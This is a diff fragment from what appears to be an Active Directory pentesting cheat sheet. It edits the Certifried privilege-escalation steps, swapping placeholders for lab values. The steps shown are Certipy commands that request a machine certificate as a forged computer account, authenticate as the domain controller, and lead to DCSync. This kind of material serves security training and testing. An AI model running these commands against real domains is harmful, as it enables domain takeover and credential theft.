@@ -863,12 +863,12 @@ python3 certifried.py range.net/peter:'Welcome1234' -dc-ip 192.168.86.182
 
 4. Request certificate with [Certipy](https://github.com/ly4k/Certipy)
 ```
-certipy req domain.local/FakeComputer\$:Password123@dc.domain.local -ca DOMAIN-DC-CA -template Machine
+certipy req range.net/WIN-JLSLKICW6EP\$:'PY2nc0ubG8WT'@ca01.range.net -ca range-CA01-CA -template Machine
 ```
 
 5. Authenticate with the requested certificate earlier
 ```
-certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
+certipy auth -pfx dc01.pfx -dc-ip 192.168.86.182
 ```
 
 5. [DCSync](#dcsync) and win
